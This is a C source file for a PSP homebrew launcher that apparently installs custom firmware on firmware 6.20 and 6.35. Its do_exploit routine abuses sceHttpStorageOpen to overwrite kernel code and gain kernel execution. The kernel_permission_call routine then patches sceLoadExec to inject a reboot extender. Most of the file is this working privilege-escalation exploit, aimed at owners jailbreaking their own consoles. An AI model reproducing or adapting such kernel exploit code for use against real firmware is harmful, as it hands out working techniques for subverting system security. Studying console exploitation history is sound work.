#include <pspkernel.h>
#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <psppower.h>
#include <string.h>
#include <zlib.h>
#include "systemctrl.h"
#include "rebootex.h"
#include "utils.h"
#include "printk.h"

#include "installer.h"
#include "Rebootex_prx.h"
#include "launcher_patch_offset.h"
#include "rebootex_conf.h"

PSP_MODULE_INFO("PXELauncher", PSP_MODULE_USER, 1, 0);
PSP_MAIN_THREAD_ATTR(PSP_THREAD_ATTR_USER | PSP_THREAD_ATTR_VFPU);
PSP_HEAP_SIZE_KB(128);

//installer path
char installerpath[256];

//psp model
int psp_model = 0;

u32 psp_fw_version = 0;

//load reboot function
int (* LoadReboot)(void * arg1, unsigned int arg2, void * arg3, unsigned int arg4) = NULL;

extern int sceHttpStorageOpen(int a0, int a1, int a2);
extern int sceKernelPowerLock(unsigned int, unsigned int);

u8 decompress_buf[1024*1024L];

void build_rebootex_configure(void)
{
	rebootex_config *conf = (rebootex_config *)(REBOOTEX_CONFIG);

	conf->magic = REBOOTEX_CONFIG_MAGIC;
	conf->psp_model = psp_model;
	conf->rebootex_size = size_rebootex;
	conf->psp_fw_version = psp_fw_version;
}

//load reboot wrapper
int _LoadReboot(void * arg1, unsigned int arg2, void * arg3, unsigned int arg4)
{
	//copy reboot extender
	memcpy((char *)REBOOTEX_START, rebootex, size_rebootex);

	//reset reboot flags
	memset((char *)REBOOTEX_CONFIG, 0, 0x100);
	//copy installer path
	memcpy((char *)REBOOTEX_CONFIG_ISO_PATH, installerpath, sizeof(installerpath));

	build_rebootex_configure();

	//forward
	return LoadReboot(arg1, arg2, arg3, arg4);
}

void recovery_sysmem(void)
{
	_sw(0x3C058801, g_offs->sceKernelPowerLockForUser); // lui $a1, 0x8801
}

//our 6.35 kernel permission call
int kernel_permission_call(void)
{
	struct sceLoadExecPatch *patch;

	//cache invalidation functions
	void (* _sceKernelIcacheInvalidateAll)(void) = (void *)g_offs->sceKernelIcacheInvalidateAll;
	void (* _sceKernelDcacheWritebackInvalidateAll)(void) = (void *)g_offs->sceKernelDcacheWritebackInvalidateAll;

	recovery_sysmem();

	//sync cache
	_sceKernelIcacheInvalidateAll();
	_sceKernelDcacheWritebackInvalidateAll();

	//LoadCoreForKernel_EF8A0BEA
	SceModule2 * (* _sceKernelFindModuleByName)(const char * libname) = (void *)g_offs->sceKernelFindModuleByName;

	//find LoadExec module
	SceModule2 * loadexec = _sceKernelFindModuleByName("sceLoadExec");

	//SysMemForKernel_458A70B5
	int (* _sceKernelGetModel)(void) = (void *)g_offs->sceKernelGetModel;

	psp_model = _sceKernelGetModel();

	if(psp_model == PSP_GO) {
		patch = &g_offs->loadexec_patch_05g;
	} else {
		patch = &g_offs->loadexec_patch_other;
	}

	//replace LoadReboot function
	_sw(MAKE_CALL(_LoadReboot), loadexec->text_addr + patch->LoadRebootCall);

	//patch Rebootex position to 0x88FC0000
	_sw(0x3C0188FC, loadexec->text_addr + patch->RebootJump); // lui $at, 0x88FC

	//save LoadReboot function
	LoadReboot = (void*)loadexec->text_addr + patch->LoadReboot;

	_sceKernelIcacheInvalidateAll();
	_sceKernelDcacheWritebackInvalidateAll();

	//return success
	return 0xC01DB15D;
}

#if 0
void freezeme(unsigned int color)
{
	while(1)
	{
		unsigned int *p = (unsigned int*) 0x04000000;
		while (p < (unsigned int*) 0x04400000) *p++ = color;
	}
}
#endif

int install_in_cfw(void)
{
	//installer load result
	int result = 0;

	//load installer module
	SceUID mod = sceKernelLoadModule(installerpath, 0, NULL);

	//installer loaded
	if (mod >= 0) {
		//start installer
		result = sceKernelStartModule(mod, strlen(installerpath) + 1, installerpath, NULL, NULL);
	}

	return 0;
}

int write_file(const char *path, unsigned char *buf, int size)
{
	SceUID fd;
	int ret;

	fd = sceIoOpen(path, PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);

	if (fd < 0) {
		goto error;
	}

	ret = sceIoWrite(fd, buf, size);

	if (ret < 0) {
		goto error;
	}

	sceIoClose(fd);

	return 0;
error:
	if (fd >= 0)
		sceIoClose(fd);

	return -1;
}

int gzip_decompress(u8 *dst, const u8 *src, int size)
{
	int ret;
	z_stream strm;

	strm.zalloc = Z_NULL;
	strm.zfree = Z_NULL;
	strm.opaque = Z_NULL;

	ret = inflateInit2(&strm, 15+16);

	if(ret != Z_OK) {
		return -1;
	}

	strm.avail_in = size;
	strm.next_in = (void*)src;
	strm.avail_out = 1024*1024L;
	strm.next_out = decompress_buf;

	ret = inflate(&strm, Z_FINISH);

	if(ret == Z_STREAM_ERROR) {
		inflateEnd(&strm);

		return -3;
	}

	memcpy(dst, decompress_buf, strm.total_out);
	deflateEnd(&strm);

	return strm.total_out;
}

static u8 file_buffer[1024 * 1024L];

void write_files(const char *base)
{
	char fn[256];
	int newsize;

	newsize = gzip_decompress(file_buffer, installer, size_installer);

	if(newsize < 0) {
		pspDebugScreenPrintf("cannot decompress installer %d\n", newsize);

		return;
	}

	strcpy(fn, base);
	strcat(fn, "installer.prx");
	write_file(fn, file_buffer, newsize);

	newsize = gzip_decompress(file_buffer, Rebootex_prx, size_Rebootex_prx);
	
	if(newsize < 0) {
		pspDebugScreenPrintf("cannot decompress rebootex %d\n", newsize);
		
		return;
	}

	strcpy(fn, base);
	strcat(fn, "Rebootex.prx");
	write_file(fn, file_buffer, newsize);
}

void do_exploit(void)
{
	u32 kernel_entry, entry_addr;
	u32 interrupts;
	u32 i;

	for(i=1; i<=6; ++i) {
		sceUtilityLoadModule(i + 0xFF);
	}

	sceHttpStorageOpen(-612, 0, 0);
	sync_cache();
	sceHttpStorageOpen((g_offs->sceKernelPowerLockForUser>>2), 0, 0); // scePowerLock override
	sync_cache();

	interrupts = pspSdkDisableInterrupts();
	kernel_entry = (u32) &kernel_permission_call;
	entry_addr = ((u32) &kernel_entry) - 16;
	sceKernelPowerLock(0, ((u32) &entry_addr) - g_offs->sceKernelPowerLockForUser_data_offset);
	pspSdkEnableInterrupts(interrupts);

	for(i=6; i>=1; --i) {
		sceUtilityUnloadModule(i + 0xFF);
	}
}

//entry point
int main(int argc, char * argv[])
{
	pspDebugScreenInit();

	psp_fw_version = sceKernelDevkitVersion();

#ifdef CONFIG_620
	if(psp_fw_version == FW_620) {
		goto version_OK;
	}
#endif

#ifdef CONFIG_635
	if(psp_fw_version == FW_635) {
		goto version_OK;
	}
#endif

	pspDebugScreenPrintf("Sorry. This program doesn't support your FW(0x%08X).\n", psp_fw_version);
	sceKernelDelayThread(5*1000000);
	goto exit;

version_OK:
	setup_patch_offset_table(psp_fw_version);
	
	//puzzle installer path
	strcpy(installerpath, argv[0]);

	char * slash = strrchr(installerpath, '/');
	if (slash) slash[1] = '\0';
	
	write_files(installerpath);
	strcat(installerpath, "installer.prx");

	printk_init("ms0:/launcher.txt");
	printk("Hello exploit\n");

	if(sctrlHENGetVersion() >= 0) {
		install_in_cfw();

		return 0;
	}

	do_exploit();

exit:
	//trigger reboot
	sceKernelExitGame();

	//kill thread
	sceKernelExitDeleteThread(0);

	//return
	return 0;
}

//exit point
int module_stop(SceSize args, void * argp)
{
	//return
	return 0;
}
